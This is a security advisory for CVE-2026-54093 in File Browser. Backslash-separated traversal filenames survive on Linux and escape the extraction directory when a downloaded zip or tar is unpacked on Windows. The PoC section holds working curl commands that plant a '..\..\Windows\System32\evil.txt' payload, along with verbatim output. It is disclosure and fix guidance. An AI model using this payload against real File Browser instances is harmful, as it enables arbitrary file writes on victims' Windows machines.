# [M] File Browser: FilePath traversal in download-as-zip/tar via Windows-style backslash separators in stored filenames

## Summary
Severity: Medium
Advisory: GHSA-gxjx-7m74-hcq8
CVE: CVE-2026-54093
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:N/VA:N/SC:N/SI:H/SA:L (CVSS_V4)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-gxjx-7m74-hcq8
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.63.6
- Go: `github.com/filebrowser/filebrowser` — affected >=0

## Details
### Summary
filebrowser builds the download-as-zip / download-as-tar archive entry names with `filepath.ToSlash`, which on a Linux host is a no-op for backslashes (`\` is only a path separator on Windows). A file whose name contains Windows-style traversal (`..\..\..\evil.txt`) is accepted by the resource handlers, stored on the Linux filesystem with a literal backslash name, and then emitted **verbatim** as the archive entry name. Windows extractors (Explorer, 7-Zip, WinRAR, .NET `ZipFile.ExtractToDirectory`) interpret `\` as a path separator and write the extracted file **outside** the extraction directory — arbitrary file write on the victim who downloads and extracts the archive.

### Details
`http/raw.go` `getFiles()` constructs the in-archive name and passes it to `github.com/mholt/archives@v0.1.5`:
```go
nameInArchive := strings.TrimPrefix(path, commonPath)
nameInArchive = strings.TrimPrefix(nameInArchive, string(filepath.Separator))
nameInArchive = filepath.ToSlash(nameInArchive) // Linux no-op: ToSlash only rewrites '\' on Windows
archiveFiles = append(archiveFiles, archives.FileInfo{
    FileInfo:      info,
    NameInArchive: nameInArchive,
    Open:          func() (fs.File, error) { return d.user.Fs.Open(path) },
})
```
On Linux `filepath.Separator == '/'`, so `filepath.ToSlash` leaves any literal backslash in the stored filename untouched. `mholt/archives` `nameOnDiskToNameInArchive` then writes that name verbatim into the zip/tar central directory.

The filename reaches the filesystem because the resource create path (`http/resource.go` `resourcePostHandler`) derives the name from `r.URL.Path` and cleans it with `path.Clean("/" + ...)`, which treats only `/` as a separator. A URL-encoded backslash segment (`%5C`) therefore survives cleaning, and the file is created on the Linux FS with a literal `\` in its name. Any user with the **Create** permission (the default for new users, and signup-enabled instances let anyone self-register) can plant such a file.

### PoC
Deployed against the official image `filebrowser/filebrowser:v2.63.5` (current release, 2026-05-21).

```bash
# 1. Deploy
docker volume create fb-srv-vol
docker run -d --name fb-poc -p 8088:80 -v fb-srv-vol:/srv filebrowser/filebrowser:v2.63.5
# wait for /health == 200; read the generated admin password from `docker logs fb-poc`
PW="<password from docker logs>"

# 2. Authenticate
TOK=$(curl -s -X POST http://localhost:8088/api/login \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin\",\"password\":\"$PW\"}")

# 3. Create a folder, then a file whose NAME is a Windows traversal payload (backslash = %5C)
curl -s -o /dev/null -w "mkdir=%{http_code}\n" \
  -X POST "http://localhost:8088/api/resources/evilzone/" -H "X-Auth: $TOK"
FNAME='..%5C..%5C..%5C..%5C..%5CWindows%5CSystem32%5Cevil.txt'
curl -s -o /dev/null -w "putfile=%{http_code}\n" \
  -X POST "http://localhost:8088/api/resources/evilzone/${FNAME}?override=true" \
  -H "X-Auth: $TOK" --data-binary 'PWNED-BY-TONGHUAROOT'

# 4. Download the folder as a zip and inspect the entry name
curl -s -o /tmp/fb_evil.zip "http://localhost:8088/api/raw/evilzone?algo=zip" -H "X-Auth: $TOK"
python3 - <<'PY'
import zipfile, binascii
z = zipfile.ZipFile('/tmp/fb_evil.zip')
print("entries:", [i.orig_filename for i in z.infolist()])
data = open('/tmp/fb_evil.zip','rb').read()
idx = data.find(b'PK\x01\x02')
print("central-dir hex:", binascii.hexlify(data[idx:idx+72]).decode())
print("contains 0x5c backslash byte:", b'\x5c' in data[idx:idx+200])
PY
```

**Observed output (verbatim):**
```
mkdir=200
putfile=200
entries: ['..\\..\\..\\..\\..\\Windows\\System32\\evil.txt']
central-dir hex: 504b01021403140008080000f002c25cc0fcca3f1400000014000000280009000000000000000000a081000000002e2e5c2e2e5c2e2e5c2e2e5c2e2e5c57696e646f77735c537973
contains 0x5c backslash byte: True
```
Server-side, the file exists with a literal backslash name:
```
-rw-r-----  1 user user  20  ..\..\..\..\..\Windows\System32\evil.txt
```
The central-directory hex tail `2e2e5c 2e2e5c 2e2e5c 2e2e5c 2e2e5c 57696e646f7773 5c 53797973...` decodes to `..\..\..\..\..\Windows\Sys...`.

**Negative control** — a normal filename produces a clean entry, and a forward-slash traversal is correctly stripped by `path.Clean`:
```
safezone entries: ['normal.txt']
PUT ..%2F..%2Fevil2.txt  ->  HTTP 301  (collapsed by path.Clean; nothing escapes)
```
This proves `/` is handled but `\` is the unhandled gap.

To observe the Windows-side traversal effect, extract `fb_evil.zip` on Windows:
```powershell
Expand-Archive -Path .\fb_evil.zip -DestinationPath .\out -Force
# 7-Zip / WinRAR with default settings honor the ..\ parents and write outside .\out
```

### Impact
Arbitrary file write (CWE-22) on any party who downloads a folder/selection as an archive from filebrowser and extracts it on Windows. The attacker is any authenticated user with Create permission (or an anonymous user on signup-enabled instances); the victim is typically an administrator or another user who is given access to the attacker's directory (e.g. via a share) and downloads it as a zip/tar. Because filebrowser is frequently deployed as a multi-user file server, this crosses a trust boundary: a low-privileged or untrusted uploader can plant files that compromise the machine of anyone who downloads and extracts the archive on Windows (e.g. writing to Startup folders or overwriting executables/config in the extraction root's parent tree).

### Affected versions
All current versions through v2.63.5 (verified against the v2.63.5 release image). The `filepath.ToSlash`-based normalization in `http/raw.go` `getFiles()` is the root cause; `github.com/mholt/archives@v0.1.5` passes the name through verbatim.

### Suggested fix
Normalize Windows separators out of the in-archive name regardless of host OS, in `http/raw.go` `getFiles()` before constructing `archives.FileInfo`:
```go
nameInArchive = filepath.ToSlash(nameInArchive)
nameInArchive = strings.ReplaceAll(nameInArchive, "\\", "/") // strip Windows separators on any host
```
Optionally also reject or sanitize filenames containing `\` at create time in `http/resource.go` so backslash names cannot be stored at all. This mirrors the canonical fix for the equivalent Gotenberg issue, where POSIX-only `filepath.Base` likewise failed to strip backslashes on Linux.

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-gxjx-7m74-hcq8
- https://github.com/filebrowser/filebrowser/commit/847d08bdd135e5c3659f2e6dea2f0cd36617af9b
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.63.6
